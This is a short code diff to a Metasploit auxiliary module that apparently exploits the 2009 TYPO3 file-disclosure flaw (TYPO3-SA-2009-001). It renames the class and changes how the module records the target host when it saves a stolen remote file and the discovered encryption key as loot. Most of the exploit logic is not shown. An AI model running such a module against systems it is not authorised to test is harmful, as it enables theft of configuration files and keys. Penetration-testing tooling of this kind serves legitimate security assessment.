@@ -11,7 +11,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class Metasploit4 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
 	include Msf::Auxiliary::Report
@@ -141,9 +141,10 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 		when 'application/octet-stream'
+			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
 			print_good("Discovered encryption key : #{final}")
 			print_good("Writing local file " + File.basename(datastore['RFILE'].downcase) + " to loot")
-			store_loot("typo3_" + File.basename(datastore['RFILE'].downcase), "text/xml", rhost, file.body, "typo3_" + File.basename(datastore['RFILE'].downcase), "Typo3_sa_2009_001")
+			store_loot("typo3_" + File.basename(datastore['RFILE'].downcase), "text/xml", addr, file.body, "typo3_" + File.basename(datastore['RFILE'].downcase), "Typo3_sa_2009_001")
 			return
 		else
 			if datastore['ENC_KEY'] != ''
